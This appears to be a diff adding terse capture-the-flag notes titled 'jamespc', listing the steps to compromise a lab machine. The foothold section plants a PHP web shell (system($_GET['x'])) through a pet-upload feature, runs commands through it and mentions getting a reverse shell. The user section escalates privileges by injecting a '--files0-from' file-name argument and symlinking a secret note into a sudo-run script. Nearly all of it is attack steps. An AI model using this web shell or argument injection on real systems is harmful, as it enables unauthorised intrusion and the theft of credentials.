@@ -1,0 +1,13 @@
+jamespc
+
+FOOTHOLD:
+    Create pet with name t.php
+    Rename description to <?php system($_GET['x']); ?>
+    Use /pets/t.php?x=whoami
+    Get reverse shell
+USER:
+    Create temp dir
+    touch '--files0-from'
+    ln -s /home/james/secret-note.txt x
+    sudo -u james /home/james/totalwc.sh
+    Get password, change user using su
